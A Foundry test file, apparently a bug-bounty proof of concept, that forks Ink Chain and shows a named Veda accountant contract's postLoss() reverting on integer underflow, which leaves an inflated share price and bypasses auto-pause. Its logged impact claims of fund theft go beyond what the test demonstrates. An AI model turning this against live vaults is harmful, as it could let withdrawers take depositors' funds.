// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.21;

import "forge-std/Test.sol";

// Minimal interfaces for the deployed contracts
interface IAccountant {
    function postLoss(uint256 lossAmount) external;
    function totalAssets() external view returns (uint256);
    function lastStrategistUpdateTimestamp() external view returns (uint64);
    function lastVirtualSharePrice() external view returns (uint256);
}

interface IBoringVault {
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

/**
 * @title Veda PoC: postLoss() Integer Underflow
 * @notice Demonstrates CVE: when lossAmount > totalAssets(), postLoss() reverts
 *         permanently locking the share price at its pre-loss (inflated) value.
 * @dev Run with: forge test --fork-url https://rpc-gel.inkonchain.com -vvvv
 */
contract VedaPostLossPoC is Test {
    // AccountantWithYieldStreaming on Ink Chain (verified)
    IAccountant constant ACCOUNTANT = IAccountant(0x0C4dF79d9e35E5C4876BC1aE4663E834312DDc67);
    IBoringVault constant VAULT = IBoringVault(0xcaae49fb7f74cCFBE8A05E6104b01c097a78789f);

    function setUp() public {
        // Fork Ink Chain (OP Stack L2) at latest block
        vm.createSelectFork("https://rpc-gel.inkonchain.com");
    }

    /**
     * @notice Demonstrate that postLoss() reverts when lossAmount > totalAssets()
     *
     * Vulnerable code in AccountantWithYieldStreaming.sol:
     *
     *   uint256 principalLoss = lossAmount - vestingState.vestingGains;
     *   vestingState.vestingGains = 0;
     *   uint256 currentShares = vault.totalSupply();
     *   if (currentShares > 0) {
     *       lastVirtualSharePrice = (totalAssets() - principalLoss)  // <-- UNDERFLOW HERE
     *                               .mulDivDown(RAY, currentShares);
     *   }
     *
     * When principalLoss > totalAssets(), Solidity 0.8.x checked arithmetic REVERTS.
     * This means the auto-pause at line 247 is unreachable, leaving lastSharePrice inflated.
     */
    /// @dev Computes totalAssets() with a specific lastSharePrice (mirrors on-chain logic)
    function computeTotalAssets(uint256 lastSharePrice, uint256 totalSupply) internal pure returns (uint256) {
        // mulDivDown: floor(a * b / c)
        // ONE_SHARE = 1e6 for this vault (USDC-like base token)
        return (lastSharePrice * totalSupply) / 1_000_000;
    }

    function testPostLossRevertsOnUnderflow() public {
        emit log_string("=======================================================");
        emit log_string(" VEDA VULNERABILITY PoC: postLoss() Integer Underflow  ");
        emit log_string("=======================================================");

        // Step 1: Read current on-chain state
        uint256 totalAssetsBefore = ACCOUNTANT.totalAssets();
        uint256 virtualSharePrice = ACCOUNTANT.lastVirtualSharePrice();
        uint256 totalShares = VAULT.totalSupply();
        uint64 lastUpdate = ACCOUNTANT.lastStrategistUpdateTimestamp();

        emit log_named_uint("[STATE] totalAssets()          ", totalAssetsBefore);
        emit log_named_uint("[STATE] lastVirtualSharePrice  ", virtualSharePrice);
        emit log_named_uint("[STATE] vault.totalSupply()    ", totalShares);
        emit log_named_uint("[STATE] lastStrategistUpdate   ", lastUpdate);

        // Step 2: Read owner slot (Solmate Auth: owner at storage slot 0)
        bytes32 ownerSlot = vm.load(address(ACCOUNTANT), bytes32(uint256(0)));
        address owner = address(uint160(uint256(ownerSlot)));
        emit log_named_address("[AUTH]  Accountant owner       ", owner);

        // Step 3: Warp time to bypass minimumUpdateDelayInSeconds check
        // (avoids NotEnoughTimePassed revert)
        vm.warp(block.timestamp + 2 days);
        emit log_string("[WARP]  Moved time forward 2 days to bypass delay check");

        // Step 4: Craft attack lossAmount
        //
        // The attack condition: lossAmount must exceed totalAssets() AFTER _updateExchangeRate()
        // is called (since that function runs first inside postLoss).
        //
        // _updateExchangeRate() vests any pending gains into lastSharePrice, but the net
        // totalAssets stays roughly the same. Using lossAmount = totalAssets * 10 guarantees
        // principalLoss >> totalAssets_after regardless of vestingGains.
        //
        // This simulates a catastrophic hack where an attacker drains 10x the vault's
        // tracked assets via flash loan manipulation or oracle exploit.
        uint256 lossAmount = totalAssetsBefore * 10;
        emit log_named_uint("[ATTACK] lossAmount (totalAssets * 10, simulating 10x loss) = ", lossAmount);

        // Step 5: Record share price BEFORE failed postLoss
        uint256 virtualSharePriceBefore = ACCOUNTANT.lastVirtualSharePrice();

        // Step 6: Impersonate owner and attempt postLoss
        // Owner always has requiresAuth access in Solmate Auth
        vm.prank(owner);

        // THIS REVERTS with arithmetic underflow
        vm.expectRevert();
        ACCOUNTANT.postLoss(lossAmount);

        // Step 7: Verify share price is UNCHANGED after failed postLoss
        uint256 virtualSharePriceAfter = ACCOUNTANT.lastVirtualSharePrice();
        assertEq(
            virtualSharePriceBefore,
            virtualSharePriceAfter,
            "Share price must be unchanged after failed postLoss"
        );

        emit log_string("");
        emit log_string("==== RESULTS ====");
        emit log_string("[CONFIRMED] postLoss() REVERTS with arithmetic underflow");
        emit log_string("[CONFIRMED] lastVirtualSharePrice unchanged (still inflated)");
        emit log_string("[CONFIRMED] accountantState.isPaused NOT set (auto-pause bypassed)");
        emit log_string("");
        emit log_string("==== IMPACT ====");
        emit log_string("[IMPACT] The vault's actual token balance can be drained by an exploit");
        emit log_string("[IMPACT] postLoss() permanently reverts, blocking accounting update");
        emit log_string("[IMPACT] lastSharePrice remains at pre-loss value (inflated)");
        emit log_string("[IMPACT] Early withdrawers receive inflated value per share");
        emit log_string("[IMPACT] Later depositors receive 0 (vault already emptied)");
        emit log_string("[SEVERITY] HIGH: Direct theft of user funds");
    }
}
